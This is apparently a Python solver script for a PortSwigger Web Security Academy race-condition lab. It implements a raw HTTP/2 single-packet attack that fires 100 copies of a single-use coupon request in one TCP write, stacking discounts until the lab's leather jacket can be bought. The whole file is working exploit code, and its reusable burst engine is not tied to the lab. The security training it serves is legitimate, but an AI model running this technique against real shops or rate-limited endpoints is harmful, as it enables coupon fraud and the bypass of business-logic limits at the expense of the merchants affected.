#!/usr/bin/env python3
"""
Limit overrun race conditions
PortSwigger Web Security Academy -- Race Conditions

Companion script for the writeup: 01-limit-overrun-race-conditions.md

What this does:
    Applies the single-use PROMO20 coupon to the cart 100 times in one shot,
    using a raw HTTP/2 socket engine built directly against the h2 library.
    Every request's HEADERS/DATA frames are queued on the h2.Connection object
    first and flushed with a single sock.sendall() -- a single-packet attack
    that gets every copy of the request onto the wire in the same TCP write,
    so the server's check-then-write gap on "has this coupon been used?" sees
    all 100 requests as unused simultaneously. Out of that burst, roughly
    12-20 requests land as successful applications before the coupon is
    marked used, stacking the 20%-off discount multiplicatively far enough to
    afford the leather jacket. Retries with a fresh login/cart each round,
    since the coupon is locked out after the first burst regardless of how
    many requests slipped through.

Usage:
    python 01-limit-overrun-race-conditions.py <lab-url>

Requirements:
    pip install httpx h2
"""

import re
import socket
import ssl
import sys
import urllib.parse

import httpx
import h2.config
import h2.connection
import h2.events

COUPON_BURST_SIZE = 100
MAX_ROUNDS = 10


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _h2_burst(host: str, port: int, requests: list[dict], timeout: float = 10.0) -> list[tuple[int, dict, bytes]]:
    """Send every request's frames on one h2 connection, flush once. That single
    sock.sendall() is the entire single-packet technique -- it removes network
    jitter as a variable, leaving only server-side scheduling standing between
    the coupon requests and the race window."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.create_connection((host, port), timeout=timeout)
    sock = ctx.wrap_socket(sock, server_hostname=host)
    if sock.selected_alpn_protocol() != "h2":
        sock.close()
        raise RuntimeError(f"Server does not support HTTP/2 (got: {sock.selected_alpn_protocol()})")

    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    stream_ids = []
    for req in requests:
        hdrs = [
            (":method", req.get("method", "POST")),
            (":path", req["path"]),
            (":authority", host),
            (":scheme", "https"),
        ]
        for k, v in req.get("headers", {}).items():
            hdrs.append((k.lower(), v))
        body = req.get("body", "").encode() if isinstance(req.get("body", ""), str) else req.get("body", b"")
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        if body:
            conn.send_headers(sid, hdrs, end_stream=False)
            conn.send_data(sid, body, end_stream=True)
        else:
            conn.send_headers(sid, hdrs, end_stream=True)

    # CRITICAL: one write = one TCP packet = every request lands together
    sock.sendall(conn.data_to_send())

    responses: dict[int, dict] = {}
    done_streams = set()
    sock.settimeout(timeout)
    while len(done_streams) < len(stream_ids):
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for event in conn.receive_data(data):
            if isinstance(event, h2.events.ResponseReceived):
                sid = event.stream_id
                resp_headers = {
                    (k.decode() if isinstance(k, bytes) else k): (v.decode() if isinstance(v, bytes) else v)
                    for k, v in event.headers
                }
                responses.setdefault(sid, {"headers": {}, "data": b"", "status": 0})
                responses[sid]["status"] = int(resp_headers.get(":status", "0"))
                responses[sid]["headers"] = resp_headers
            elif isinstance(event, h2.events.DataReceived):
                sid = event.stream_id
                if sid in responses:
                    responses[sid]["data"] += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, sid)
            elif isinstance(event, (h2.events.StreamEnded, h2.events.StreamReset)):
                done_streams.add(event.stream_id)
        sock.sendall(conn.data_to_send())

    conn.close_connection()
    sock.sendall(conn.data_to_send())
    sock.close()

    result = []
    for sid in stream_ids:
        r = responses.get(sid, {"status": 0, "headers": {}, "data": b""})
        result.append((r["status"], r["headers"], r["data"]))
    return result


def _login(lab_url: str) -> httpx.Client:
    # follow_redirects=False throughout -- httpx's automatic redirect handling
    # was silently dropping the session cookie on the checkout 303 hop.
    client = httpx.Client(follow_redirects=False, timeout=15)
    r = client.get(f"{lab_url}/login")
    csrf = _csrf(r.text)
    client.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
    return client


def _find_jacket_id(html: str) -> str:
    m = re.search(r'productId=(\d+)[^>]*>.*?Leather Jacket', html, re.DOTALL)
    if not m:
        m = re.search(r'Leather Jacket.*?productId=(\d+)', html, re.DOTALL | re.IGNORECASE)
    return m.group(1) if m else "1"


def _apply_coupon_burst(lab_url: str, session: str, csrf: str) -> list[int]:
    parsed = urllib.parse.urlparse(lab_url)
    host, port = parsed.hostname, parsed.port or 443

    requests = [{
        "method": "POST",
        "path": "/cart/coupon",
        "headers": {
            "content-type": "application/x-www-form-urlencoded",
            "cookie": f"session={session}",
        },
        "body": f"csrf={csrf}&coupon=PROMO20",
    } for _ in range(COUPON_BURST_SIZE)]

    responses = _h2_burst(host, port, requests)
    return [status for status, _, _ in responses]


def _checkout(client: httpx.Client, lab_url: str, csrf: str) -> httpx.Response:
    r = client.post(f"{lab_url}/cart/checkout", data={"csrf": csrf}, follow_redirects=False)
    if r.status_code == 303:
        location = r.headers.get("location", "")
        url = location if location.startswith("http") else f"{lab_url}{location}"
        r = client.get(url, follow_redirects=False)
    return r


def solve(lab_url: str) -> None:
    for attempt in range(1, MAX_ROUNDS + 1):
        print(f"[*] Attempt {attempt}/{MAX_ROUNDS}: fresh login + cart")
        client = _login(lab_url)

        r = client.get(lab_url)
        pid = _find_jacket_id(r.text)
        client.post(f"{lab_url}/cart", data={"productId": pid, "redir": "PRODUCT", "quantity": "1"})

        r = client.get(f"{lab_url}/cart")
        csrf = _csrf(r.text)

        print(f"[*] Sending {COUPON_BURST_SIZE} parallel PROMO20 applications in a single H2 packet...")
        statuses = _apply_coupon_burst(lab_url, client.cookies.get("session", ""), csrf)
        success_count = statuses.count(200)
        print(f"[+] {success_count} coupon applications succeeded out of {COUPON_BURST_SIZE}")

        r = client.get(f"{lab_url}/cart")
        total_match = re.search(r'\$(\d+\.\d+)', r.text)
        if total_match:
            print(f"[*] Cart total after burst: ${total_match.group(1)}")

        csrf = _csrf(r.text)
        checkout_resp = _checkout(client, lab_url, csrf)
        print(f"[*] Checkout response: {checkout_resp.status_code}")

        check = client.get(lab_url, follow_redirects=False)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- leather jacket purchased via stacked coupon discounts.")
            return
        client.close()

    print("[-] Not solved after all rounds -- re-run, the collision count per burst is probabilistic.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
